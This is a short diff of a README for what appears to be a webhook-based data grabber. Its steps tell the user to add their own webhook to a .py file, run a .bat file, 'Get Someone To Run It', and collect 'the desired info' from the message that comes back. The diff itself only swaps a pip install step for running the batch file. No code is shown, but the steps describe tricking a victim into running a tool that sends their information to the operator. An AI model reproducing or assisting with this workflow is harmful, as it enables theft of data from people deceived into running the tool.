@@ -13,7 +13,7 @@ To Edit All You Gotta Do Is Change 2 Lines of code!
 - Step 1:    Download the .py file
 - Step 2:    Open It Using A Text Editor
 - step 3:    Change the  "Your Webhook Here" To Your Webhook
-- Step 4:    Open CMD And Run The Command "pip install -r Requirements.txt"
+- Step 4:    Run The .bat File
 - Step 5:    Get Someone To Run It
 - Step 6:    You Should Get A Message With The Desired Info
 
